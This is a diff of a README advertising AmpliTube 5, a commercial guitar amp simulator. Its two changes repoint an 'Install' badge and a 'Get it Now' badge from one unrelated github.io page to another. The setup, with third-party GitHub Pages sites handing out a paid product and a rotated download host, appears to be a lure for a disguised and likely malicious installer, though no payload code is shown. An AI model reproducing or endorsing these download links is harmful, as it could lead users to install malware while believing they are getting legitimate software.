@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gazan-programs.github.io/.github/ampliTube5)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://polycia-apps.github.io/.github/ampliTube5)
 
 </div>
 
@@ -81,7 +81,7 @@ AmpliTube 5's value proposition is clearest against the physical alternative: ac
 
 <p align="center">
 
-[![Get it Now AmpliTube 5](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://gazan-programs.github.io/.github/ampliTube5)
+[![Get it Now AmpliTube 5](https://img.shields.io/badge/Get_it_Now-3A86FF?style=for-the-badge&logo=apple&logoColor=white)](https://polycia-apps.github.io/.github/ampliTube5)
 
 </p>
 
